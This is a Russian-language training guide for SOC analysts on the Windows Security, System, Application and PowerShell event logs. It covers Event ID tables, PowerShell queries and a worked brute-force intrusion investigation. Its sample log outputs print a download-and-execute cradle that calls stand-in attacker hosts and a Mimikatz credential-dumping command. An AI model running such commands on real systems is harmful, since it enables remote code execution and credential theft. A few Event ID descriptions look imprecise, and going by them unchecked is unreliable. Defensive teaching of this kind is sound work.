# Ключевые каналы Windows Event Log: Security, System, Application, PowerShell

## Канал Security: регистрация событий безопасности и аудита

Канал **Security** — центральное хранилище записей, порождаемых подсистемой аудита Windows. В отличие от свободного логирования приложений, содержимое этого канала определяется не программным вызовом `ReportEvent`, а настройками локальных политик аудита или групповых политик домена. События пишутся от имени провайдера `Microsoft-Windows-Security-Auditing` и охватывают все попытки входа, доступ к объектам файловой системы или реестра, изменение привилегий, управление учётными записями и политиками безопасности. SOC L1 рассматривает этот канал как первичный источник для детектирования компрометации учётных данных и подозрительной активности на конечных точках.

Связь с политиками означает, что без явного включения аудита нужных категорий журнал будет практически пуст. Базовый набор записей, рекомендованный Microsoft: вход/выход (Logon/Logoff), управление учётными записями, изменение политик, привилегии и аудит процессов. Расширенная конфигурация (доступ к объектам, детальный отслеживание процессов) даёт более полную картину, но резко увеличивает объём данных.

**Сравнительная таблица ключевых каналов Event Log** (размещена здесь для ориентации сразу по всем четырём аспектам):

| Канал | Основное назначение | Ключевые провайдеры | Примеры значимых Event ID | Роль в SOC L1 |
|-------|---------------------|----------------------|---------------------------|--------------|
| **Security** | Аудит безопасности: входы, доступ, политики | Microsoft-Windows-Security-Auditing | 4624 (вход), 4625 (отказ), 4648 (явные уч. данные), 4672 (спец. привилегии), 4720 (создание пользователя) | Обнаружение bruteforce, подозрительных входов, эскалации, аномалий учётных записей |
| **System** | События компонентов ОС: драйверы, службы, оборудование | Service Control Manager, Kernel-Power, Microsoft-Windows-DriverFrameworks | 7036 (запуск/остановка службы), 7045 (установка службы), 41 (некорректное выключение), 1001 (BugCheck) | Индикация аварийных перезагрузок, установки persistence, сбоев драйверов |
| **Application** | Ошибки и сообщения пользовательских приложений | Различные (.NET Runtime, MsiInstaller, Application Error) | 1000 (ошибка приложения), 1001 (отчёт Windows Error Reporting) | Выявление сбоев защитных средств, уязвимостей, эксплуатации |
| **PowerShell** (операционные журналы) | Активность движка PowerShell и защитное логирование | Microsoft-Windows-PowerShell/Operational, PowerShell (классический) | 4103 (Module Logging), 4104 (Script Block Logging), 800 (подозрительный конвейер) | Детектирование вредоносных скриптов, обфускации, лоу-футпринт атак |

### Внутреннее устройство канала Security

Каждое событие Security представляет собой структурированную запись, расшифровка которой требует понимания идентификатора события (Event ID) и сопутствующих полей. Большинство актуальных для SOC записей принадлежат категории «Аудит» и содержат блок `EventData` со специфическими парами ключ-значение.

Основные поля, на которые ориентируется аналитик L1:

- **SubjectUserSid / SubjectUserName** — учётная запись, выполнившая действие (или SYSTEM при анонимном входе).
- **TargetUserName** — цель операции (например, имя пользователя при входе).
- **LogonType** (для 4624/4625) — тип входа, критичный для различения интерактивного (2), сетевого (3), удалённого рабочего стола (10), планировщика (5) и т.д.
- **IpAddress / IpPort** — IP-адрес источника запроса (полезен для выявления необычной географии).
- **LogonProcessName** — вызывающий процесс (например, `User32`, `Advapi`, `NtLmSsp`).
- **Status / SubStatus** — код ошибки (для 4625: `0xC000006A` — неправильный пароль, `0xC0000234` — аккаунт заблокирован).

JSON-схема иллюстративной записи (на основе XML-фрагмента):

```json
{
  "EventID": 4624,
  "Channel": "Security",
  "Provider": "Microsoft-Windows-Security-Auditing",
  "EventData": {
    "SubjectUserSid": "S-1-5-18",
    "SubjectUserName": "SYSTEM",
    "TargetUserSid": "S-1-5-21-...-500",
    "TargetUserName": "Administrator",
    "LogonType": "10",
    "IpAddress": "192.168.1.100",
    "LogonProcessName": "User32",
    "WorkstationName": "PC-01"
  }
}
```

Ниже приведена таблица ключевых Event ID канала Security, обязательных к знанию аналитиком SOC L1 (не исчерпывающая, но покрывающая типовые инциденты):

| Event ID | Название | Описание и значимость | Типичный индикатор атаки |
|----------|----------|------------------------|---------------------------|
| 4624 | An account was successfully logged on | Успешный вход. LogonType позволяет понять вектор. | LogonType 3 с необычного IP; LogonType 10 от не-административного пользователя. |
| 4625 | An account failed to log on | Неудачная попытка входа. High rate → брутфорс. | Множественные 4625 за короткий промежуток с одним TargetUserName или с SubStatus 0xC0000234 (блокировка). |
| 4634 | An account was logged off | Завершение сессии. Используется для сопоставления длительности. | Ранний логаут после подозрительного входа может указывать на автоматизированный скрипт. |
| 4648 | A logon was attempted using explicit credentials | Вход с явными учётными данными (runas, psexec, планировщик). | Процесс, указанный в поле ProcessName, не свойственный для данного действия. |
| 4672 | Special privileges assigned to new logon | Назначение специальных привилегий (SeDebugPrivilege, SeTcbPrivilege). | Внезапное появление у обычного пользователя привилегий администратора в рамках новой сессии. |
| 4720 | A user account was created | Создание новой учётной записи. | Создание скрытого пользователя (например, с символом `$` в конце имени). |
| 1102 | The audit log was cleared | Очистка журнала аудита. Почти всегда подозрительно. | Предшествует или следует за вредоносной активностью, попытка заметания следов. |
| 4776 | The computer attempted to validate the credentials for an account | Проверка учётных данных контроллером домена (NTLM). | Подозрительно, если исходит от рабочей станции, не являющейся сервером с устаревшей аутентификацией. |

### Применение в реальной работе SOC L1

Аналитик L1 работает с каналом Security преимущественно через централизованную SIEM-систему, но при расследовании на отдельной машине или верификации алертов использует прямые команды PowerShell. Главные задачи: идентифицировать источник и метод атаки, оценить radius поражения, документировать время и вовлечённые учётные записи.

Типичный пайплайн при сработке правила на множественные неудачные входы:

1. **Извлечь последние события 4625**: сгруппировать по TargetUserName, подсчитать, выявить IP.
2. **Проверить наличие успешного входа после серии отказов**: события 4624 с тем же TargetUserName и IP.
3. **Определить LogonType**: если 3 (сеть) и IP публичный — возможно, атака на открытый RDP.
4. **Проверить, не последовала ли эскалация**: найти 4672 в той же сессии.
5. **Проверить очистку логов**: событие 1102.

Для автоматической выборки и фильтрации событий из Security применяется cmdlet `Get-WinEvent` (предпочтительный, так как `Get-EventLog` использует устаревший API). Команда для получения неудачных входов за последний час может выглядеть так:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Security';
    ID=4625;
    StartTime=(Get-Date).AddHours(-1)
} -MaxEvents 100 | Format-Table TimeCreated, Id, @{n='User';e={$_.Properties[5].Value}}, @{n='IP';e={$_.Properties[18].Value}} -AutoSize
```

Иллюстративный вывод (значения условны):

```
TimeCreated            Id   User            IP
-----------            --   ----            --
2025-03-20 14:22:05   4625 Administrator   203.0.113.45
2025-03-20 14:22:07   4625 Administrator   203.0.113.45
2025-03-20 14:22:09   4625 Administrator   203.0.113.45
```

Для получения событий с конкретным LogonType (например, идентификация входов через службу терминалов):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 50 | Where-Object { $_.Properties[8].Value -eq 10 }
```

Применение утилиты `wevtutil` удобно для экспорта в архивные форматы:

```bash
wevtutil qe Security /c:10 /rd:true /f:text /q:"*[System[(EventID=4625)]]"
```

В SOC на базе SIEM корреляции используют также агрегацию по `TargetUserName` и `IpAddress` для выявления горизонтального перемещения или Password Spray. Следует помнить, что отсутствие записей в канале Security может быть следствием не включенных политик аудита — всегда проверяйте `auditpol /get /category:*` на целевой машине.

## Канал System: события ядра, драйверов и служб

Канал **System** ведёт запись сообщений от компонентов самой Windows, драйверов устройств и системных служб. В отличие от Application, здесь не ожидаются события прикладных программ; фокус — стабильность ОС, сбои оборудования, изменение конфигурации служб. Для SOC этот канал важен не столько из-за прямых индикаторов компрометации, сколько как источник контекста: неожиданная перезагрузка сервера, новая служба или падение критического процесса могут быть следствием вредоносной активности или создавать уязвимость.

Провайдеры внутри канала System разнообразны: `Service Control Manager` (Event ID 7034, 7036, 7045), `Microsoft-Windows-Kernel-Power` (ID 41 — критическое выключение без чистого завершения), `Microsoft-Windows-DriverFrameworks-UserMode`, `Microsoft-Windows-Time-Service` и другие. Структура события также содержит Event ID, Level, Source, Message, но поля данных зависят от конкретного провайдера и редко стандартизированы.

### Ключевые события и их интерпретация

Таблица наиболее значимых Event ID канала System для анализатора L1:

| Event ID | Источник | Описание | Связь с инцидентами безопасности |
|----------|----------|----------|---------------------------------|
| 7036 | Service Control Manager | Служба перешла в состояние «работает» или «остановлена». | Позволяет понять, какие службы активны перед или после атаки. |
| 7045 | Service Control Manager | Новая служба установлена в системе. | Явный признак внедрения persistence — вредоносная служба (например, зловред имитирует имя легитимного компонента). |
| 41 | Kernel-Power | Система перезагрузилась без чистого завершения работы. | Может указывать на BSOD, физическое отключение питания или атаку, вызвавшую крах ядра. Требует проверки смежных дампов. |
| 1001 | Windows Error Reporting (WER) | Отчёт о критическом сбое (BugCheck). | Даёт информацию о коде ошибки и вызвавшем модуле; помогает отличить случайный сбой от эксплойта. |
| 6005 | EventLog | Служба журнала событий запущена (маркер старта системы). | Анализ таймлайна: позволяет вычислить время загрузки ОС, сравнивая с моментами инцидента. |
| 1074 | User32 | Запрос выключения или перезагрузки от пользователя/процесса. | Идентифицирует, кто инициировал выключение; неавторизованное выключение может быть попыткой уничтожить улики. |
| 7000 | Service Control Manager | Служба не смогла запуститься (ошибка). | Если затрагивает EDR/AV, немедленное расследование обязательно. |

Важно: событие 7045 содержит не только имя службы, но и путь к исполняемому файлу (`ImagePath`). Зловреды часто используют запутанные пути вроде `%TEMP%` или маскируются под системные имена с опечатками. Пример сбора информации из 7045 с помощью PowerShell:

```powershell
Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" -MaxEvents 5 | ForEach-Object {
    $x = [xml]$_.ToXml()
    $ns = @{ns='http://schemas.microsoft.com/win/2004/08/events/event'}
    $name = $x.SelectSingleNode('//ns:Data[@Name="ServiceName"]/text()', $ns).Value
    $path = $x.SelectSingleNode('//ns:Data[@Name="ImagePath"]/text()', $ns).Value
    [PSCustomObject]@{Time=$_.TimeCreated; Service=$name; Path=$path}
} | Format-Table -AutoSize
```

Иллюстративный вывод:

```
TimeCreated              Service            Path
-----------              -------            ----
2025-03-20 15:01:42     EvilSvc            C:\Users\user\AppData\Local\Temp\svchost.exe
2025-03-20 12:30:10     WpnService         C:\Windows\system32\svchost.exe -k netsvcs
```

Добавление фильтрации по подозрительным путям (`-notmatch 'C:\\Windows\\'`) выявляет явные аномалии.

События источников `Kernel-Power` и `WER` для SOC обычно обрабатываются автоматической корреляцией в SIEM: последовательность нескольких перезагрузок за короткое время на критичном сервере инициирует алерт класса «Availability». Аналитик L1 должен уметь сопоставить время перезагрузки (Event ID 6005 после 41) с временными метками атак в Security, чтобы исключить совпадение или выявить деструктивное воздействие.

### Мониторинг системных изменений

По долгу службы SOC L1 обязан мониторить изменения в наборе служб и драйверов, даже если отдельные ID прямо не указывают на злонамеренность. В Windows 10/11 и Server 2016+ фоновые задачи обслуживания могут создавать кратковременные службы, поэтому одиночное событие 7045 в момент обновления не обязательно подозрительно. Однако появление сразу нескольких служб или изменение службы, связанной с безопасностью, — красный флаг.

Рекомендуется использовать комбинированное отслеживание: события 7036 (остановка службы), за которыми следует 7045 (установка) с таким же именем, могут означать попытку обойти защиту, остановив легитимный сервис и подменив его. Аналитик может выполнить быстрый поиск последовательности:

```powershell
$events = Get-WinEvent -LogName System -MaxEvents 2000
$events | Where-Object { $_.Id -eq 7036 -or $_.Id -eq 7045 } | Sort-Object TimeCreated
```

В практике рекомендуется также отслеживать события загрузки драйверов (`Microsoft-Windows-DriverFrameworks-UserMode/Operational`), но этот канал рассматривается отдельно и не включён в четвёрку базовых.

## Канал Application: логирование пользовательских приложений

Канал **Application** предназначен для сообщений, отправляемых прикладным ПО через Win32 API `ReportEvent`. В отличие от структурированных событий аудита в Security или системных событий ядра, этот канал крайне гетерогенен: формат и содержание зависят от разработчика. Тем не менее он критичен для SOC, поскольку здесь регистрируются сбои антивирусов, брокеров безопасности, средств резервного копирования, а также ошибки приложений, эксплуатирующих уязвимости.

К числу постоянных источников относятся: `Application Error` (Event ID 1000 — аварийное завершение процесса), `Windows Error Reporting` (ID 1001 — детали сбоя), `.NET Runtime` (ID 1026 — исключения .NET приложений), а также всевозможные программы, начиная от Microsoft Office и заканчивая корпоративным ПО. Сторонние защитные решения (EDR, антивирусы) нередко пишут события в этот канал при обнаружении угроз, что можно использовать для триажа инцидента, если агент не передаёт телеметрию централизованно.

### Ключевые идентификаторы событий

Таблица наиболее часто встречающихся ID и их значение для SOC:

| Event ID | Источник | Описание | SOC-интерпретация |
|----------|----------|----------|-------------------|
| 1000 | Application Error | Приложение аварийно завершилось. Поля: имя исполняемого файла, версия, модуль сбоя, код исключения. | Частые падения `lsass.exe` могут указывать на атаки переполнения; падение EDR-агента — на целенаправленное отключение. |
| 1001 | Windows Error Reporting | Уровень отчёта об ошибке (обычно сопровождает 1000). | Содержит дополнительные параметры, например, указание на повреждённый блок памяти. |
| 1026 | .NET Runtime | Исключение в управляемом приложении. | Может быть следствием эксплуатации десериализации или отказа в обслуживании. |
| 1002 | Application Hang | Приложение зависло. | Массовые зависания могут сигнализировать о высокой нагрузке, вызванной вредоносной активностью или DoS. |
| 11707/11708 | MsiInstaller | Установка/удаление продукта. | Внезапная установка неавторизованного ПО — повод для проверки. |

Поскольку канал не имеет жёсткой схемы, извлечение полезной информации требует разбора свойства `Message` и XML-деталей. В большинстве SIEM-систем есть парсеры для Windows Event Log, но при локальном расследовании можно использовать PowerShell для фильтрации по уровню и источнику.

Пример поиска ошибок приложений с извлечением имени отказавшего процесса:

```powershell
Get-WinEvent -LogName Application -Level 2 -MaxEvents 10 | ForEach-Object {
    $msg = $_.Message
    # Простой парсинг первого слова как имя процесса (зависит от формата)
    if ($msg -match 'Faulting application name:\s+(\S+)\.exe') {
        $app = $matches[1]
    } else { $app = 'Unknown' }
    [PSCustomObject]@{Time=$_.TimeCreated; App=$app; EventID=$_.Id}
} | Format-Table -AutoSize
```

Иллюстративный вывод:

```
TimeCreated              App         EventID
-----------              ---         -------
2025-03-20 16:10:01     lsass       1000
2025-03-20 16:09:55     MyAV        1000
2025-03-20 16:09:30     outlook     1002
```

Такой дамп позволяет быстро увидеть, что сразу после падения антивируса (`MyAV`) произошло падение `lsass`, требующее эскалации.

### SOC-ориентированные тактики мониторинга

Аналитик L1 должен уметь выделить из шума Application события, которые могут быть индикаторами компрометации или дестабилизации защиты. Рекомендуемый минимальный набор действий:

1. **Фильтр по уровню Critical/Error**: команды наподобие `Get-WinEvent -LogName Application -Level 1,2` позволяют отсеять информационный мусор.
2. **Отслеживание источников безопасности**: если в организации используется антивирус «XProtect», ищите события его провайдера, особое внимание на ID, означающие неудачную загрузку компонентов или отключение.
3. **Мониторинг установки программ**: `MsiInstaller` события (ID 11707) при сопоставлении с расписанием обновлений могут выявить неавторизованные пакеты.
4. **Корреляция с крахами системных процессов**: падение `svchost.exe` с определённым идентификатором может быть вызвано RCE.

В дополнение к ручной фильтрации полезно настроить на SIEM правила, детектирующие резкое увеличение ошибок в Application, что часто сопутствует эпидемии вредоносного ПО или отказу критичной инфраструктуры.

Утилита `wevtutil` для быстрого экспорта в CSV может использоваться так:

```bash
wevtutil qe Application /c:20 /rd:true /f:csv /q:"*[System[(Level=1 or Level=2)]]" > errors.csv
```

## Канал PowerShell: ведение журналов действий командной оболочки

**PowerShell** — не классический файл `*.evtx` в папке `Windows\System32\winevt\Logs`, а совокупность специализированных журналов, включаемых через политики. Ключевыми являются:

- `Windows PowerShell` (классический канал) — запись запуска движка (Event ID 400/403), но мало деталей.
- `Microsoft-Windows-PowerShell/Operational` — современный канал, содержащий скрипт-блоки и сведения о модулях (ID 4100–4106).
- Дополнительный канал `PowerShellCore/Operational` для PowerShell 7.

В контексте SOC наиболее ценные данные дают Script Block Logging (4104) и Module Logging (4103), которые, будучи включены, фиксируют фактически всё, что выполняется в сессии PowerShell — включая деобфусцированные команды. Без этих логов расследование Living-off-the-land атак становится чрезвычайно затруднительным, так как в других каналах следов почти нет.

### Конфигурация ведения журнала PowerShell

Стандартное состояние поставки Windows — Script Block Logging и Module Logging отключены. Включение производится либо через групповые политики (Administrative Templates → Windows PowerShell), либо прямым редактированием реестра. Рекомендуется включить все три механизма:

- **Module Logging** (ID 4103) — регистрирует выполнение конвейера, включая переменные и команды.
- **Script Block Logging** (ID 4104) — записывает содержимое скриптовых блоков, в том числе обработанные вредоносные скрипты, в обход обфускации. Событие содержит текст `ScriptBlockText` и параметры.
- **Transcription** (ID 4105) — полный текстовый журнал сессии.

Пример включения через реестр (иллюстративная схема):

```powershell
# Включение Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
# Включение Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*"
```

Для применения через GPO администраторы SOC часто обеспечивают централизованное развёртывание политик на все конечные точки, что является необходимым условием для эффективной детекции угроз.

### Ключевые Event ID и их интерпретация

Таблица событий, на которых строится мониторинг PowerShell:

| Event ID | Канал | Описание | SOC-значение |
|----------|-------|----------|--------------|
| 400 | Windows PowerShell | Запуск движка PowerShell (указывает версию, режим) | Фиксация начала сеанса, версия может указать на устаревшую уязвимую версию. |
| 403 | Windows PowerShell | Завершение движка | Позволяет установить длительность сессии. |
| 4103 | Microsoft-Windows-PowerShell/Operational | Module Logging: команды и параметры конвейера | Даже частично обфусцированные команды могут быть восстановлены. |
| 4104 | Microsoft-Windows-PowerShell/Operational | Script Block Logging: полный текст скрипт-блока | Самый важный источник для выявления вредоносных скриптов. |
| 4105 | Microsoft-Windows-PowerShell/Operational | Начало/остановка транскрипции | Сигнализирует о возможном включении скрытого мониторинга атакующим. |
| 800 | Windows PowerShell | Подозрительная активность конвейера (если включён) | Может содержать попытки обхода ограничений. |

Аналитик SOC должен уметь получать эти события и анализировать их содержимое. Пример запроса на получение всех Script Block событий за последние 24 часа:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" -MaxEvents 50 |
ForEach-Object {
    $x = [xml]$_.ToXml()
    $ns = @{ns='http://schemas.microsoft.com/win/2004/08/events/event'}
    $block = $x.SelectSingleNode('//ns:Data[@Name="ScriptBlockText"]/text()', $ns)?.Value
    [PSCustomObject]@{Time=$_.TimeCreated; Block=$block}
} | Format-Table -Wrap -AutoSize
```

Иллюстративный вывод (пример вредоносного блока):

```
TimeCreated              Block
-----------              -----
2025-03-20 17:34:12      IEX (New-Object Net.WebClient).DownloadString('http://bad.example/gimme.ps1'); Invoke-Run
```

Такой вывод напрямую даёт URL вредоносного скрипта и команду, что кардинально ускоряет разбор инцидента.

### Особенности применения в SOC L1

Даже на первой линии важно понимать, что атакующие часто применяют обфускацию, и модуль логирования деобфусцирует код — поэтому события 4103 и 4104 могут содержать частично декодированные строки. Но полностью полагаться только на этот канал нельзя, так как атака может использовать `-EncodedCommand` или встроенные средства без PowerShell (WMI, COM). Комбинированный анализ с Security (событие 4688 с родительским процессом) повышает точность.

Сбор логов PowerShell крайне желательно направлять в SIEM. При ручном расследовании на машине аналитик может использовать `Get-WinEvent` с хэш-таблицей фильтров. Дополнительно следует проверять классический канал на наличие подозрительных ошибок:

```powershell
Get-WinEvent -LogName "Windows PowerShell" -MaxEvents 20 | Where-Object { $_.Level -le 3 }
```

Мониторинг PowerShell — неотъемлемая часть современной безопасности, поскольку подавляющее большинство целевых атак на Windows включает как минимум одну стадию с его использованием.

## Сквозной практический пример: расследование атаки с подбором пароля и последующей активностью PowerShell

**Исходные условия:** Windows Server 2019, включены рекомендованные политики аудита, настроены Script Block Logging и Module Logging для PowerShell. Аналитик SOC L1 получил алерт SIEM: «Multiple failed logons for user ‘svc_backup’ followed by a successful logon and suspicious PowerShell script execution». Необходимо провести локальное расследование для подтверждения инцидента и сбора деталей.

### Шаг 1: Анализ неудачных попыток входа

Извлекаем события 4625 из канала Security для целевой учётной записи за последний час.

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-1)} |
    Where-Object { $_.Properties[5].Value -eq 'svc_backup' }
```

Иллюстративный вывод:

```
TimeCreated              Id    TargetUserName    IPAddress       SubStatus
-----------              --    ---------------   ----------      ---------
2025-03-20 18:01:12     4625   svc_backup         198.51.100.7   0xC000006A
2025-03-20 18:01:14     4625   svc_backup         198.51.100.7   0xC000006A
2025-03-20 18:01:16     4625   svc_backup         198.51.100.7   0xC000006A
2025-03-20 18:01:17     4625   svc_backup         198.51.100.7   0xC000006A
2025-03-20 18:01:19     4625   svc_backup         198.51.100.7   0xC000006A
```

Код ошибки `0xC000006A` означает «неправильный пароль». Пять попыток за 8 секунд с одного IP — явный bruteforce.

### Шаг 2: Поиск успешного входа

Фильтруем события 4624 для той же учётной записи и того же IP:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624; StartTime=(Get-Date).AddHours(-1)} |
    Where-Object { $_.Properties[5].Value -eq 'svc_backup' -and $_.Properties[18].Value -eq '198.51.100.7' }
```

Иллюстративный вывод:

```
TimeCreated              Id    TargetUserName    LogonType   IPAddress
-----------              --    ---------------   ---------   ---------
2025-03-20 18:01:20     4624   svc_backup         10          198.51.100.7
```

LogonType 10 (RemoteInteractive — RDP) подтверждает, что злоумышленник подключился к рабочему столу.

### Шаг 3: Проверка эскалации привилегий

Ищем событие 4672 (специальные привилегии) в той же временной окрестности:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672; StartTime=(Get-Date).AddHours(-1)} |
    Where-Object { $_.TimeCreated -ge '2025-03-20 18:01:20' -and $_.TimeCreated -lt '2025-03-20 18:05:00' }
```

Результат показывает событие для пользователя `svc_backup` с привилегией `SeImpersonatePrivilege` — типичная эскалация через `PrintSpoofer` или аналоги.

### Шаг 4: Просмотр логов PowerShell

За тот же период извлекаем события Script Block Logging:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104 and TimeCreated[timediff(@SystemTime) <= 300000]]]" |
ForEach-Object {
    $x = [xml]$_.ToXml()
    $ns = @{ns='http://schemas.microsoft.com/win/2004/08/events/event'}
    $block = $x.SelectSingleNode('//ns:Data[@Name="ScriptBlockText"]/text()', $ns)?.Value
    [PSCustomObject]@{Time=$_.TimeCreated; Block=$block}
}
```

Иллюстративный вывод:

```
TimeCreated              Block
-----------              -----
2025-03-20 18:02:15      $c=new-object -com WinHttpRequest; $c.open('GET','http://198.51.100.7/payload.ps1'); $c.Send();
                         IEX $c.ResponseText
2025-03-20 18:02:30      Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

Скрипт загружает и выполняет `Invoke-Mimikatz` для кражи учётных данных. Артефакт однозначно подтверждает компрометацию.

### Шаг 5: Проверка системных логов на установку персистентности

Для исключения сохраняемой вредоносной службы запрашиваем события 7045 (новая служба) за тот же период:

```powershell
Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" | Where-Object { $_.TimeCreated -ge '2025-03-20 18:02:00' }
```

Вывод показывает установку службы `WinUpdate` с путём `C:\Windows\Temp\svchost.exe`. Это сервис переживания перезагрузки, требующий немедленной изоляции системы.

**Ожидаемый вывод примера:** Демонстрация связного процесса расследования с использованием четырёх ключевых каналов. Security лог выявил вектора и источник атаки, System — установку вредоносной службы, PowerShell — точный код и C2, что в совокупности позволило понять полную картину инцидента и предпринять действия по сдерживанию.

## Источники

- [How to Check Windows App Logs: Event Viewer PowerShell and Tools Guide | Windows Forum](https://windowsforum.com/threads/how-to-check-windows-app-logs-event-viewer-powershell-and-tools-guide.382932) (Application log, Event Viewer методы)
- [Windows Logging Basics - The Ultimate Guide To Logging](https://www.loggly.com/ultimate-guide/windows-logging-basics) (основные поля и назначение каналов)
- [What is Windows Event Log? | eG Innovations](https://www.eginnovations.com/blog/what-is-windows-event-log) (базовая архитектура Windows Event Log)
- [Automating Export for Windows Events Logs with PowerShell — Infotect Design Solutions](https://www.infotect.us/resources/3m474qk32g8wjqfppbnuoskyxnpsa6) (примеры экспорта, настройка прав Event Log Readers)
- [Windows Event Log Channels Definition for use with LM Logs | LogicMonitor](https://www.logicmonitor.com/support/windows-event-log-channels-definition-for-use-with-lm-logs) (определения каналов)
- [Comprehensive Guide to Using PowerShell for Efficient Event Log Searches - NinjaOne](https://www.ninjaone.com/script-hub/search-event-logs-powershell) (обзор поиска через PowerShell)
- [Microsoft Windows Event Logs](https://docs.hunters.ai/docs/microsoft-windows-event-logs) (перечни поддерживаемых Event ID для Security, System, Application, PowerShell)
- [PowerShell Logging | Detection](https://insiderthreatmatrix.org/detections/DT055) (Event ID 4103, включение Module Logging)
- [Get-EventLog (Microsoft.PowerShell.Management) - PowerShell | Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1) (рекомендация использовать Get-WinEvent, примеры)
- [Understanding the Windows Server Event Log | Microsoft Community Hub](https://techcommunity.microsoft.com/blog/itopstalkblog/understanding-the-windows-server-event-log/4417350) (управление размерами, SDDL для доступа)
- [Top 11 Windows Security Events to Monitor | LBMC Cybersecurity](https://www.lbmc.com/blog/top-11-windows-events-to-monitor) (важность логирования PowerShell, приоритеты мониторинга)